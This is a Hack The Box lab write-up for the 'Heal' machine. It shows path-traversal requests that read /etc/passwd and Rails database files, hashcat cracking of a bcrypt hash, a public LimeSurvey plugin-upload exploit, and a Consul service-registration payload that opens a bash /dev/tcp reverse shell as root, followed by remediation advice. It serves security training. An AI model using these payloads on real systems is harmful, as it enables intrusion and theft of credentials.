---
title: HTB Heal
slug: htb-heal-writeup
type: writeup
category: htb
date: 2025-05-13
difficulty: medium
os: linux
readTime: 10 min read
points: 45
tags: [LFI, API, RCE]
classification: CLASSIFIED-WHITE
summary: Resume download endpoint on a Ruby-on-Rails API is a raw LFI. Leak Rails config + sqlite dev DB → crack LimeSurvey admin bcrypt → plugin-upload RCE as `www-data` → unauthenticated HashiCorp Consul service-registration → root.
engagement:
  platform: Hack The Box
  target: heal.htb
  ref: 10.10.11.46
  start: 15:26 CDT
  duration: 10 min read
  operator: WDD-01
killchain:
  - { stage: RECON,    sub: "nginx + rails api",  tag: HTTP,       color: warn }
  - { stage: LFI,      sub: "download?filename=", tag: API,        color: warn }
  - { stage: CREDS,    sub: "sqlite3 dev db",     tag: HASHCAT,    color: warn }
  - { stage: RCE,      sub: "limesurvey plugin",  tag: RCE,        color: warn }
  - { stage: ROOT,     sub: "consul service reg", tag: GOAL,       color: ok }
loadout:
  - { tool: nmap,          purpose: recon }
  - { tool: burp,          purpose: proxy }
  - { tool: sqlitestudio,  purpose: db }
  - { tool: hashcat,       purpose: crack }
  - { tool: limesurvey-rce, purpose: exploit }
  - { tool: consul-api,    purpose: root }
remediation:
  - Strict `filename` allow-list on download endpoints (absolute paths, no `..`)
  - Never ship the sqlite dev DB to production; never hash secrets with bcrypt cost 4
  - Patch LimeSurvey past 6.6.4 (CVE-2024-56404 plugin upload RCE)
  - Bind Consul agent to `127.0.0.1` only, and require ACL tokens on the HTTP API
---

::: stage n=1 label="RECON" title="nginx up front, Ruby-on-Rails API in the back."

::: terminal title="shell · operator@kali" lang="bash"
$ nmap -sV -sC -A -T5 -p- 10.10.11.46 --min-rate 2000
22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Heal

$ nmap -T5 -A api.heal.htb
80/tcp open  http     nginx 1.18.0
|_http-title: Ruby on Rails 7.1.4
:::

`heal.htb` is the public site, `api.heal.htb` is the Rails backend. Register an account, build a resume, hit **Export as PDF** — the browser downloads `api.heal.htb/download?filename=<uuid>.pdf` behind the scenes.

::: img src="../assets/img/writeups/htb-heal/01-nmap.png" caption="Only SSH + HTTP on the main host; api.heal.htb is a separate vhost running Rails"

:::

::: stage n=2 label="LFI" title="`filename` param is unsanitized. Classic `../../../etc/passwd`."

::: img src="../assets/img/writeups/htb-heal/02-burp-lfi.png" caption="Burp intercept: swapping the UUID for ../../../etc/passwd"

::: terminal title="burp · GET /download" lang="http"
GET /download?filename=../../../etc/passwd HTTP/1.1
Host: api.heal.htb
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

HTTP/1.1 200 OK
root:x:0:0:root:/root:/bin/bash
...
ralph:x:1000:1000:,,,:/home/ralph:/bin/bash
:::

Rails config sits at `config/database.yml` — dev uses sqlite.

::: terminal title="burp · GET /download" lang="bash"
GET /download?filename=../../config/database.yml
→ development: adapter: sqlite3 database: storage/development.sqlite3

GET /download?filename=../../storage/development.sqlite3
→ sqlite binary, 20 KB
:::

:::

::: stage n=3 label="CREDS" title="Bcrypt ralph → `[REDACTED]`."

Open the dumped DB in SQLiteStudio. One row in the `users` table — {red:ralph@heal.htb} / `$2a$12$...` bcrypt / `is_admin = 1`.

::: img src="../assets/img/writeups/htb-heal/03-sqlite-dump.png" caption="ralph@heal.htb — bcrypt hash + is_admin = 1 in the dev sqlite"

::: terminal title="shell · operator@hashcat" lang="bash"
$ hashcat -m 3200 -a 0 hash.txt rockyou.txt
$2a$12$[BCRYPT-HASH] : [REDACTED]
:::

SSH as ralph is blocked. Admin panel is on a second vhost — `take-survey.heal.htb/index.php/admin/authentication/sa/login`. Login lands on a {cool:LimeSurvey 6.6.4} admin.

:::

::: stage n=4 label="RCE" title="LimeSurvey 6.6.4 plugin-upload → www-data shell."

Public exploit from `N4s1rl1/Limesurvey-6.6.4-RCE` ships the full chain: CSRF token → login → upload malicious plugin zip → activate → trigger.

::: terminal title="shell · operator@kali" lang="bash"
$ python3 exploit.py http://take-survey.heal.htb ralph [REDACTED] 80
[INFO]    Retrieving CSRF token for login ...
[SUCCESS] CSRF Token Retrieved
[INFO]    Sending Login Request ...
[SUCCESS] Login Successful
[INFO]    Uploading Plugin ...
[SUCCESS] Plugin Uploaded Successfully!
[INFO]    Installing Plugin ...
[SUCCESS] Plugin Installed Successfully!
[INFO]    Activating Plugin ...
[SUCCESS] Plugin Activated Successfully!
[INFO]    Triggering Reverse Shell ...
:::

::: img src="../assets/img/writeups/htb-heal/04-limesurvey-rce.png" caption="LimeSurvey 6.6.4 plugin-upload chain firing"

Listener catches the callback:

::: terminal title="shell · www-data@heal" lang="bash"
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.83] from (UNKNOWN) [10.10.11.46] 55258
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
:::

:::

::: stage n=5 label="ROOT" title="Consul is bound to localhost. `service/register` runs as root."

Rifling through `/var/www/limesurvey/application/config/config.php` leaks PostgreSQL creds — but Postgres permissions aren't enough for user pivot. `ss -tuln` is the real find:

::: terminal title="shell · www-data@heal" lang="bash"
$ ss -tuln
LISTEN  127.0.0.1:8500  (HashiCorp Consul HTTP API)
LISTEN  127.0.0.1:8301
LISTEN  127.0.0.1:8302
LISTEN  127.0.0.1:8600
:::

{cool:8500} is Consul. With no ACL tokens, anyone can `PUT /v1/agent/service/register` with a `Check` block that runs an arbitrary command — {red:as root}.

::: terminal title="shell · www-data@heal" lang="bash"
$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d '{
  "Name": "pwned",
  "ID":   "pwned",
  "Port": 9999,
  "Check": {
    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.83/6969 0>&1"],
    "Interval": "10s"
  }
}'
:::

Second listener:

::: terminal title="shell · root@heal" lang="bash"
$ nc -lvnp 6969
connect to [10.10.16.83] from heal.htb [10.10.11.46] 53994
root@heal:/# cat /root/root.txt
root@heal:/# cat /home/ron/user.txt
:::

::: img src="../assets/img/writeups/htb-heal/05-consul-root.png" caption="Consul service/register runs the Check command as root — shell on the second listener"

::: note title="WHY IT WORKED"
Consul's `Check` block is designed to execute commands for health probes — the service will run them on the schedule you specify. When the HTTP API is unauthenticated on a host where Consul runs as root, every unauthenticated caller gets arbitrary code execution as root.
:::

:::
